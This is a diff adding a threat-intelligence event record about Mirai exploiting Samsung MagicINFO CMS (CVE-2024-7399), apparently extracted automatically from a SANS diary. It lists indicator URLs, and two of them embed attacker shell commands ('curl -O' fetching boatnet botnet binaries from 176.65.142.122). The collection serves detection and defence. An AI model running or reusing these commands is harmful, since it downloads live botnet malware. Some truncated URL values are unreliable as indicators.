@@ -1,0 +1,72 @@
+{
+  "Event": {
+    "uuid": "08d52137-daf7-4ff0-887d-54ebacd4f54a",
+    "info": "\"Mirai\" Now Exploits Samsung MagicINFO CMS (CVE-2024-7399), (Mon, May 5th)",
+    "date": "2025-05-06",
+    "analysis": 0,
+    "threat_level_id": 4,
+    "timestamp": 1746524184,
+    "Orgc": {
+      "name": "ADMIN",
+      "uuid": "926e159d-1b41-4069-995e-b8eae5d338f9"
+    },
+    "Tag": [
+      {
+        "name": "RSS to IOC Collector",
+        "colour": "#004646",
+        "local": false,
+        "relationship_type": ""
+      }
+    ],
+    "Attribute": [
+      {
+        "type": "urls",
+        "category": "External analysis",
+        "to_ids": true,
+        "value": "http://176.65.142.122/hiddenbin/boatnet.x86; curl -O http://176.65.142.122/hiddenbin/boatnet.x86;cat boatnet.x86 ",
+        "comment": "Extracted from: https://isc.sans.edu/diary/rss/31920",
+        "timestamp": 1746524184
+      },
+      {
+        "type": "urls",
+        "category": "External analysis",
+        "to_ids": true,
+        "value": "http://176.65.142.122/hiddenbin/boatnet.mip",
+        "comment": "Extracted from: https://isc.sans.edu/diary/rss/31920",
+        "timestamp": 1746524184
+      },
+      {
+        "type": "urls",
+        "category": "External analysis",
+        "to_ids": true,
+        "value": "https://nvd.ni",
+        "comment": "Extracted from: https://isc.sans.edu/diary/rss/31920",
+        "timestamp": 1746524184
+      },
+      {
+        "type": "urls",
+        "category": "External analysis",
+        "to_ids": true,
+        "value": "http://176.65.142.122/oh",
+        "comment": "Extracted from: https://isc.sans.edu/diary/rss/31920",
+        "timestamp": 1746524184
+      },
+      {
+        "type": "urls",
+        "category": "External analysis",
+        "to_ids": true,
+        "value": "http://176.65.142.122/hiddenbin/boatnet.arc; curl -O http://176.65.142.122/hiddenbin/boatnet.arc;cat boatnet.arc ",
+        "comment": "Extracted from: https://isc.sans.edu/diary/rss/31920",
+        "timestamp": 1746524184
+      },
+      {
+        "type": "urls",
+        "category": "External analysis",
+        "to_ids": true,
+        "value": "https://cyber",
+        "comment": "Extracted from: https://isc.sans.edu/diary/rss/31920",
+        "timestamp": 1746524184
+      }
+    ]
+  }
+}
